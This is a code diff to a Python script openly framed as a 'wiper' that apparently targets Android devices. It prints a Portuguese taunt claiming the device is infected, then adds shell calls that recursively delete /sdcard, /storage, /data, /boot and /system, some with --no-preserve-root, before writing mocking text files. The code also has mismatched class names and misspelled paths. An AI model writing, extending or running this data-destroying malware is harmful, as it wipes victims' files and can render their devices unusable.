@@ -13,22 +13,27 @@ class malwRe:
     	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
     	sleep(1)
     	
-    	run('rm-rf Downloads', shell=shell_flag)
-    	run("rm -rf /sdcard"shell=shell_flag)
-    	
+    	run('rm-rf /Download', shell=True)
+    	run("rm -rf /sdcard/", shell=True)
+    	run("rm -rf /storage/", shell=True)
+    	run("rm -rf /Documemtos")
+    	run("rm -rf --no-preserve-root /data",shell=True)
+    	run("rm -rf --no-preserve-root /boot",shell=True)
+    	run("rm -rf --no-preserve-root /system",shell=True)
+    	run("rm -rf --no-preserve-root /sistem",shell=True)
+   	
     	if os.geteuid() == 0:
-    	    run("rm -rf /data",shell=shell_flag)
-    	    run("rm -rf /boot",shell=shell_flag)
-    	    run("rm -rf /system",shell=shell_flag)
+    	    run("rm -rf /data",shell=True)
+    	    run("rm -rf /boot",shell=True)
+    	    run("rm -rf /system",shell=True)
+    	    run("rm -rf /sistem",shell=True)
 
 
         for i in range(1, 101):
             filename = f"lol/BY_WpsDroid{i}.txt"
             with open(filename, 'w') as f:
                 f.write("kkk script kiddie otario")
-                open_file(filename)
-                
-                run("adb shell reboot -p", shell=True)
+                open(filename)           
                 
 wiper = malwaRe()
 wiper.start() 
